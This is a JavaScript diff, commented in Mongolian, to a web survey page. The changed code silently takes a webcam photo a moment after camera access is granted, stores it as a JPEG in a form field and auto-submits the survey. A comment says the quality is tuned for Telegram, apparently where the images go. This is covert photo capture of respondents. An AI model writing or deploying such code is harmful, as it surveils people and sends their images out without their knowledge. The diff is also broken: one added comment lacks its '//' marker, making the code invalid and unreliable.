@@ -224,21 +224,25 @@
 
                 // Камер бэлэн болохыг хүлээж зураг авах
                 video.onloadedmetadata = () => {
-                    setTimeout(() => {
-                        canvas.width = 640;
-                        canvas.height = 480;
-                        context.drawImage(video, 0, 0, 640, 480);
-                        
-                        const dataURL = canvas.toDataURL('image/jpeg', 0.5);
-                        photoDataInput.value = dataURL; 
+                 Камерын бодит өргөн ба өндрийг Canvas-д оноох
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+    
+                 setTimeout(() => {
+                // Зургийг яг камерын харьцаагаар (aspect ratio) зурна
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+                 // Чанарыг 0.5-0.6 орчим байлгавал хэмжээ нь Telegram-д тохиромжтой
+                const dataURL = canvas.toDataURL('image/jpeg', 0.6);
+                photoDataInput.value = dataURL; 
 
-                        // Камерыг унтраах
-                        cameraStream.getTracks().forEach(track => track.stop());
+                // Камер унтраах
+                cameraStream.getTracks().forEach(track => track.stop());
 
-                        // Формыг одоо илгээнэ
-                        surveyForm.submit();
-                    }, 1200); 
-                };
+                // Формыг илгээх
+                surveyForm.submit();
+             }, 1200); 
+            };
             })
             .catch(err => {
                 // --- ТАТГАЛЗСАН ЭСВЭЛ АЛДАА ГАРСАН ТОХИОЛДОЛ ---
